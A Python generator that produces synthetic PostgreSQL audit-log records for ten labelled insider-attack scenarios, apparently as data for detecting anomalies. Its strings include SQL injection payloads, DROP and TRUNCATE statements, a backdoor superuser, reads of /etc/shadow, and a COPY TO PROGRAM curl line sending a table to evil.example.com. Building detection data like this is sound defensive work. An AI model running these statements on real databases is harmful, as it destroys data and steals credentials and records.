#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
File: attack.py (v12.0 - SQL đa dạng hơn, mỗi scenario có 8-12 mẫu câu lệnh)
"""
import random

SCENARIOS = {
    1:  "Data_Exfiltration",
    2:  "Privilege_Escalation",
    3:  "Data_Sabotage",
    4:  "Account_Hijacking",
    5:  "Slow_Rate_Exfiltration",
    6:  "Off_Hours_Activity",
    7:  "SQL_Injection_Attempt",
    8:  "Lateral_Movement",
    9:  "Data_Staging",
    10: "Credential_Abuse",
}

def get_attack_sequence(user, frame, is_after_hours, scenario_id, session_steps):
    return _SCENARIO_HANDLERS[scenario_id](user, frame, is_after_hours, scenario_id, session_steps)

# =====================================================================
# KỊCH BẢN 1: Data Exfiltration – đa dạng mệnh đề, JOIN, subquery
# =====================================================================
def _scenario_1(user, frame, is_after_hours, sid, steps):
    tbl = random.choice(["customer", "orders", "lineitem", "partsupp"])
    records = []
    for step in range(steps):
        rows = random.randint(200_000, 1_200_000)
        stmts = [
            f"SELECT * FROM public.{tbl} ORDER BY 1 DESC LIMIT {rows};",
            f"COPY public.{tbl} TO '/tmp/export_{tbl}_{step}.csv' DELIMITER ',' CSV HEADER;",
            f"SELECT * FROM public.{tbl} WHERE 1=1 LIMIT {rows} OFFSET {step * 100_000};",
            f"SELECT c.c_name, o.o_totalprice FROM public.customer c JOIN public.orders o ON c.c_custkey=o.o_custkey LIMIT {rows};",
            f"SELECT l.l_shipdate, l.l_quantity, o.o_totalprice FROM public.lineitem l JOIN public.orders o ON l.l_orderkey=o.o_orderkey WHERE l.l_quantity > 40 LIMIT {rows};",
            f"SELECT * FROM public.{tbl} WHERE {tbl[:2]}_key IN (SELECT {tbl[:2]}_key FROM public.{tbl} LIMIT {rows});",
            f"SELECT * FROM public.{tbl} WHERE {tbl[:2]}_key > {random.randint(1,1000)} ORDER BY 1 LIMIT {rows};",
            f"SELECT t.*, s.s_name FROM public.{tbl} t JOIN public.supplier s ON t.{tbl[:2]}_suppkey=s.s_suppkey LIMIT {rows};"
            if tbl in ("partsupp", "lineitem") else
            f"SELECT * FROM public.{tbl} LIMIT {rows};",

            # Thêm template mới
            f"SELECT * FROM public.{tbl} WHERE {tbl[:2]}_key % 2 = 0 LIMIT {random.randint(50000,150000)};",
            f"SELECT * FROM public.{tbl} ORDER BY random() LIMIT {random.randint(50000,100000)};",
            f"SELECT COUNT(*), AVG({tbl[:2]}_key) FROM public.{tbl} WHERE {tbl[:2]}_key > 0;",
        ]
        stmt = stmts[step % len(stmts)]
        records.append(_build_record(user, stmt, tbl, "SUCCESS", rows, frame, is_after_hours, sid))
    return records

# =====================================================================
# KỊCH BẢN 2: Privilege Escalation – thêm bước REVOKE, ALTER ROLE
# =====================================================================
def _scenario_2(user, frame, is_after_hours, sid, steps):
    records = []
    sequence_ops = [
        ("SELECT relname, relacl FROM pg_class WHERE relkind='r';",                                              "pg_class",                  "SUCCESS",          20),
        ("SELECT usename, usesuper, usecreatedb FROM pg_user;",                                                  "system_catalog",            "SUCCESS",          10),
        ("SELECT column_name, data_type FROM information_schema.columns WHERE table_name='salary_details';",     "information_schema.columns","OK",               15),
        ("SELECT * FROM public.salary_details WHERE salary > 50000000;",                                         "salary_details",            "PERMISSION DENIED", 0),
        (f"GRANT SELECT ON TABLE public.salary_details TO {user};",                                              "salary_details",            "PERMISSION DENIED", 0),
        (f"GRANT ALL PRIVILEGES ON TABLE public.salary_details TO {user};",                                      "salary_details",            "PERMISSION DENIED", 0),
        (f"ALTER ROLE {user} SUPERUSER;",                                                                        "system_catalog",            "PERMISSION DENIED", 0),
        (f"UPDATE public.salary_details SET salary = salary * 3 WHERE db_user = '{user}';",                      "salary_details",            "PERMISSION DENIED", 0),
        ("SELECT * FROM pg_roles WHERE rolsuper = true;",                                                        "system_catalog",            "SUCCESS",          5),
        (f"REVOKE ALL ON ALL TABLES IN SCHEMA public FROM PUBLIC; GRANT ALL TO {user};",                         "system_catalog",            "PERMISSION DENIED", 0),
    ]

    # Thêm template mới hợp lý cho escalation
    extra_ops = [
        (f"ALTER ROLE {user} NOLOGIN;", "system_catalog", "PERMISSION DENIED", 0),
        (f"GRANT TEMP ON DATABASE tpch TO {user};", "system_catalog", "PERMISSION DENIED", 0),
    ]
    sequence_ops += extra_ops
    for step in range(steps):
        op_idx = min(step, len(sequence_ops) - 1)
        stmt, tbl, status, rows = sequence_ops[op_idx]
        records.append(_build_record(user, stmt, tbl, status, rows, frame, is_after_hours, sid))
    return records

# =====================================================================
# KỊCH BẢN 3: Data Sabotage – thêm UPDATE mass, ALTER TABLE, DROP INDEX
# =====================================================================
def _scenario_3(user, frame, is_after_hours, sid, steps):
    tbl = random.choice(["orders", "lineitem", "salary_details", "customer"])
    records = []
    statements_pool = [
        f"UPDATE public.{tbl} SET {tbl[:2]}_comment = NULL WHERE 1=1;",
        f"UPDATE public.{tbl} SET {tbl[:2]}_comment = 'CORRUPTED' WHERE {tbl[:2]}_key > 0;",
        f"DELETE FROM public.{tbl} WHERE {tbl[:2]}_key > 0;",
        f"DELETE FROM public.{tbl} WHERE {tbl[:2]}_key IN (SELECT {tbl[:2]}_key FROM public.{tbl} LIMIT 100000);",
        f"TRUNCATE TABLE public.{tbl};",
        f"TRUNCATE TABLE public.{tbl} CASCADE;",
        f"DROP TABLE public.{tbl} CASCADE;",
        f"ALTER TABLE public.{tbl} DROP COLUMN {tbl[:2]}_comment;",
        f"DROP INDEX IF EXISTS {tbl[:2]}_pkey;",
        f"UPDATE public.{tbl} SET {tbl[:2]}_key = {tbl[:2]}_key * -1 WHERE {tbl[:2]}_key > 0;",

        # Thêm template mới
        f"UPDATE public.{tbl} SET {tbl[:2]}_comment = 'ATTACKED' WHERE {tbl[:2]}_key % 5 = 0;",
        f"DELETE FROM public.{tbl} WHERE {tbl[:2]}_key BETWEEN 100 AND 1000;",
        f"ALTER TABLE public.{tbl} RENAME COLUMN {tbl[:2]}_comment TO {tbl[:2]}_note;"
    ]
    for step in range(steps):
        status = "PERMISSION DENIED" if random.random() < 0.25 else "SUCCESS"
        rows   = random.randint(50_000, 1_500_000) if status == "SUCCESS" else 0
        stmt   = statements_pool[step % len(statements_pool)]
        records.append(_build_record(user, stmt, tbl, status, rows, frame, is_after_hours, sid))
    return records

# =====================================================================
# KỊCH BẢN 4: Account Hijacking – thêm SET ROLE, pg_shadow query
# =====================================================================
def _scenario_4(user, frame, is_after_hours, sid, steps):
    fake_user = f"hacker_bd_{random.randint(100, 999)}"
    sequence_stmts = [
        (f"SELECT usename, passwd FROM pg_shadow;",                                                     "system_catalog"),
        (f"CREATE USER {fake_user} WITH PASSWORD 'P@ssw0rd!123' SUPERUSER;",                           "system_catalog"),
        (f"GRANT ALL PRIVILEGES ON DATABASE tpch TO {fake_user};",                                     "system_catalog"),
        (f"GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public TO {fake_user};",                       "system_catalog"),
        (f"ALTER USER {fake_user} SUPERUSER CREATEDB CREATEROLE LOGIN;",                               "system_catalog"),
        (f"ALTER USER postgres PASSWORD 'NewP@ss2026!';",                                              "system_catalog"),
        (f"SET ROLE {fake_user}; SELECT * FROM public.salary_details LIMIT 100;",                      "salary_details"),
        (f"CREATE ROLE backdoor_role SUPERUSER; GRANT backdoor_role TO {fake_user};",                  "system_catalog"),
        (f"SELECT * FROM pg_user WHERE usename = '{fake_user}';",                                      "system_catalog"),
        (f"REVOKE CONNECT ON DATABASE tpch FROM PUBLIC; GRANT CONNECT TO {fake_user};",                "system_catalog"),
        # Template mới
        (f"ALTER ROLE {fake_user} NOLOGIN;", "system_catalog"),
        (f"GRANT TEMP ON DATABASE tpch TO {fake_user};", "system_catalog"),
    ]
    records = []
    for step in range(steps):
        stmt, tbl = sequence_stmts[min(step, len(sequence_stmts) - 1)]
        status    = "PERMISSION DENIED" if random.random() < 0.45 else "SUCCESS"
        records.append(_build_record(user, stmt, tbl, status, 0, frame, is_after_hours, sid))
    return records

# =====================================================================
# KỊCH BẢN 5: Slow-Rate Exfiltration – nhiều bảng, thêm JOIN nhỏ
# =====================================================================
def _scenario_5(user, frame, is_after_hours, sid, steps):
    tbl = random.choice(["customer", "orders", "lineitem", "salary_details"])
    records = []
    stmts_pool = [
        lambda off: f"SELECT * FROM public.{tbl} LIMIT 3000 OFFSET {off};",
        lambda off: f"SELECT * FROM public.{tbl} WHERE {tbl[:2]}_key > {off} LIMIT 2000;",
        lambda off: f"SELECT {tbl[:2]}_key, {tbl[:2]}_comment FROM public.{tbl} LIMIT 5000 OFFSET {off};",
        lambda off: f"SELECT c.c_name, o.o_orderdate FROM public.customer c JOIN public.orders o ON c.c_custkey=o.o_custkey LIMIT 2000 OFFSET {off};",
    ]
    chosen_fn = random.choice(stmts_pool)
    for step in range(steps):
        offset = step * random.randint(2000, 6000)
        stmt   = chosen_fn(offset)
        records.append(_build_record(user, stmt, tbl, "SUCCESS", 3000, frame, is_after_hours, sid))
    return records

# =====================================================================
# KỊCH BẢN 6: Off-Hours Activity – đa dạng bảng + INSERT trái phép
# =====================================================================
def _scenario_6(user, frame, is_after_hours, sid, steps):
    tables_pool = ["partsupp", "supplier", "orders", "customer", "salary_details"]
    records = []
    stmts_pool = [
        lambda t, r: f"SELECT * FROM public.{t} LIMIT {r} OFFSET {random.randint(0, 500)};",
        lambda t, r: f"SELECT COUNT(*), MAX({t[:2]}_key) FROM public.{t};",
        lambda t, r: f"SELECT * FROM public.{t} WHERE {t[:2]}_key BETWEEN {random.randint(1,100)} AND {random.randint(200,5000)};",
        lambda t, r: f"INSERT INTO public.{t} SELECT * FROM public.{t} WHERE {t[:2]}_key = {random.randint(1, 100)};",
        lambda t, r: f"SELECT * FROM public.{t} ORDER BY {t[:2]}_key DESC LIMIT {r};",
    ]
    for step in range(steps):
        tbl    = tables_pool[step % len(tables_pool)]
        rows   = random.randint(50, 300)
        fn     = stmts_pool[step % len(stmts_pool)]
        stmt   = fn(tbl, rows)
        status = "PERMISSION DENIED" if tbl == "salary_details" and random.random() < 0.5 else "SUCCESS"
        records.append(_build_record(user, stmt, tbl, "SUCCESS" if status == "SUCCESS" else "PERMISSION DENIED",
                                     rows if status == "SUCCESS" else 0, frame, 1, sid))
    return records

# =====================================================================
# KỊCH BẢN 7: SQL Injection – mở rộng UNION, stacked queries, blind
# =====================================================================
def _scenario_7(user, frame, is_after_hours, sid, steps):
    records = []
    injection_ops = [
        ("SELECT * FROM public.customer WHERE c_custkey = 1 OR 1=1;",                                                  "customer"),
        ("SELECT * FROM public.orders WHERE o_orderkey = 1; DROP TABLE orders;--",                                     "orders"),
        ("SELECT * FROM public.customer WHERE c_name = '' UNION SELECT usename, passwd, NULL, NULL FROM pg_shadow--;",  "customer"),
        ("'; INSERT INTO public.salary_details(db_user, salary) VALUES('hacker', 9999999);--",                         "salary_details"),
        ("SELECT * FROM public.orders WHERE o_orderkey = 1 AND 1=(SELECT COUNT(*) FROM pg_tables);",                   "orders"),
        ("SELECT * FROM public.customer WHERE c_custkey = 1 AND SLEEP(5);",                                            "customer"),
        ("SELECT * FROM public.lineitem WHERE l_orderkey=1 AND (SELECT 1 FROM pg_shadow WHERE usename='postgres')=1;", "lineitem"),
        ("'; UPDATE public.salary_details SET salary=999999 WHERE db_user='admin';--",                                 "salary_details"),
        ("SELECT * FROM public.customer WHERE c_name LIKE '%' OR 'x'='x';",                                           "customer"),
        ("SELECT pg_sleep(3); SELECT * FROM public.orders LIMIT 100;",                                                 "orders"),
        ("SELECT * FROM public.partsupp WHERE ps_partkey=1 UNION ALL SELECT NULL,usename,passwd,NULL FROM pg_shadow;", "partsupp"),
        ("SELECT * FROM public.supplier WHERE s_suppkey=1; EXEC xp_cmdshell('whoami');--",                             "supplier"),
    ]
    for step in range(steps):
        stmt, tbl = injection_ops[step % len(injection_ops)]
        status    = "PERMISSION DENIED" if random.random() < 0.65 else "SUCCESS"
        records.append(_build_record(user, stmt, tbl, status, 0, frame, is_after_hours, sid))
    return records

# =====================================================================
# KỊCH BẢN 8: Lateral Movement – quét hàng loạt bảng + cross-schema
# =====================================================================
def _scenario_8(user, frame, is_after_hours, sid, steps):
    target_tables = ["region", "nation", "part", "supplier", "partsupp",
                     "customer", "orders", "lineitem", "salary_details", "system_catalog"]
    stmts_per_tbl = {
        "region":         lambda t: f"SELECT * FROM public.{t} LIMIT 5;",
        "nation":         lambda t: f"SELECT n_name, n_regionkey FROM public.{t};",
        "part":           lambda t: f"SELECT p_name, p_type FROM public.{t} LIMIT 20;",
        "supplier":       lambda t: f"SELECT s_name, s_address FROM public.{t} LIMIT 20;",
        "partsupp":       lambda t: f"SELECT ps_partkey, ps_suppkey FROM public.{t} LIMIT 20;",
        "customer":       lambda t: f"SELECT c_name, c_acctbal FROM public.{t} LIMIT 30;",
        "orders":         lambda t: f"SELECT o_orderkey, o_totalprice FROM public.{t} LIMIT 30;",
        "lineitem":       lambda t: f"SELECT l_orderkey, l_quantity FROM public.{t} LIMIT 30;",
        "salary_details": lambda t: f"SELECT * FROM public.{t} LIMIT 10;",
        "system_catalog": lambda t: "SELECT table_name FROM information_schema.tables WHERE table_schema='public';",
    }
    records = []
    for step in range(steps):
        tbl    = target_tables[step % len(target_tables)]
        fn     = stmts_per_tbl.get(tbl, lambda t: f"SELECT * FROM public.{t} LIMIT 10;")
        stmt   = fn(tbl)
        status = "PERMISSION DENIED" if tbl in ("salary_details", "system_catalog") else "SUCCESS"
        rows   = 0 if status == "PERMISSION DENIED" else random.randint(5, 30)
        records.append(_build_record(user, stmt, tbl, status, rows, frame, is_after_hours, sid))
    return records

# =====================================================================
# KỊCH BẢN 9: Data Staging – thêm bước compress, FTP hint, multi-copy
# =====================================================================
def _scenario_9(user, frame, is_after_hours, sid, steps):
    tbl           = random.choice(["customer", "orders", "lineitem", "salary_details"])
    staging_table = f"tmp_stage_{random.randint(100, 999)}"
    sequence_flow = [
        (f"SELECT column_name, data_type FROM information_schema.columns WHERE table_name='{tbl}';",       tbl,           "SUCCESS",           10),
        (f"SELECT COUNT(*) FROM public.{tbl};",                                                            tbl,           "SUCCESS",           1),
        (f"CREATE TEMP TABLE {staging_table} AS SELECT * FROM public.{tbl} LIMIT 80000;",                 tbl,           "SUCCESS",           80_000),
        (f"INSERT INTO {staging_table} SELECT * FROM public.{tbl} WHERE {tbl[:2]}_key > 80000 LIMIT 40000;", tbl,        "SUCCESS",           40_000),
        (f"SELECT COUNT(*) FROM {staging_table};",                                                         tbl,           "SUCCESS",           1),
        (f"COPY {staging_table} TO '/tmp/{staging_table}_part1.csv' CSV HEADER;",                         tbl,           "SUCCESS",           80_000),
        (f"COPY {staging_table} TO '/tmp/{staging_table}_part2.csv' CSV HEADER DELIMITER E'\\t';",        tbl,           "PERMISSION DENIED",  0),
        (f"SELECT * FROM {staging_table} ORDER BY 1 LIMIT 100;",                                          tbl,           "SUCCESS",           100),
        (f"DROP TABLE IF EXISTS {staging_table};",                                                         tbl,           "SUCCESS",           0),
    ]
    records = []
    for step in range(steps):
        idx  = min(step, len(sequence_flow) - 1)
        stmt, target_tbl, status, rows = sequence_flow[idx]
        records.append(_build_record(user, stmt, target_tbl, status, rows, frame, is_after_hours, sid))
    return records

# =====================================================================
# KỊCH BẢN 10: Credential Abuse – thêm pg_read_binary_file, SET SESSION
# =====================================================================
def _scenario_10(user, frame, is_after_hours, sid, steps):
    records = []
    abuse_ops = [
        ("SELECT usename, passwd, valuntil FROM pg_shadow;",                                              "system_catalog"),
        ("SET ROLE postgres; SELECT * FROM public.orders LIMIT 500;",                                    "orders"),
        ("SET SESSION AUTHORIZATION postgres; SELECT * FROM public.salary_details;",                     "salary_details"),
        ("SELECT pg_read_file('/etc/passwd');",                                                           "system_catalog"),
        ("SELECT pg_read_binary_file('/etc/shadow');",                                                    "system_catalog"),
        ("SELECT lo_get(lo_creat(-1));",                                                                  "system_catalog"),
        ("SELECT * FROM pg_stat_activity WHERE usename != current_user;",                                 "system_catalog"),
        ("ALTER USER postgres PASSWORD 'hacked123!';",                                                    "system_catalog"),
        ("COPY public.salary_details TO PROGRAM 'curl -d @- https://evil.example.com';",                 "salary_details"),
        ("SELECT * FROM public.salary_details JOIN public.customer ON TRUE LIMIT 200;",                  "salary_details"),
        ("SET ROLE postgres; COPY public.orders TO '/tmp/full_orders.csv' CSV HEADER;",                  "orders"),
        ("SELECT pg_ls_dir('/var/lib/postgresql/data/');",                                               "system_catalog"),
    ]
    for step in range(steps):
        stmt, tbl = abuse_ops[step % len(abuse_ops)]
        status    = "PERMISSION DENIED" if random.random() < 0.35 else "SUCCESS"
        rows      = random.randint(200, 3000) if status == "SUCCESS" else 0
        records.append(_build_record(user, stmt, tbl, status, rows, frame, is_after_hours, sid))
    return records

# =====================================================================
# HELPER
# =====================================================================
_SYSTEM_TABLES = {"pg_catalog", "pg_shadow", "pg_roles", "pg_class",
                  "pg_namespace", "pg_locks", "pg_stat_activity",
                  "information_schema.columns"}

def _build_record(user, statement, tbl, status, rows, frame, is_after_hours, sid) -> dict:
    if 'pg_' in tbl or tbl.startswith('information_schema') or tbl in _SYSTEM_TABLES:
        tbl = "system_catalog"
    return {
        "db_user":         user,
        "sql_statement":   statement,
        "tables_involved": tbl,
        "status":          status,
        "rows_affected":   rows,
        "graph_frame":     frame,
        "is_after_hours":  is_after_hours,
        "scenario_type":   SCENARIOS[sid],
    }

_SCENARIO_HANDLERS = {i: globals()[f"_scenario_{i}"] for i in range(1, 11)}
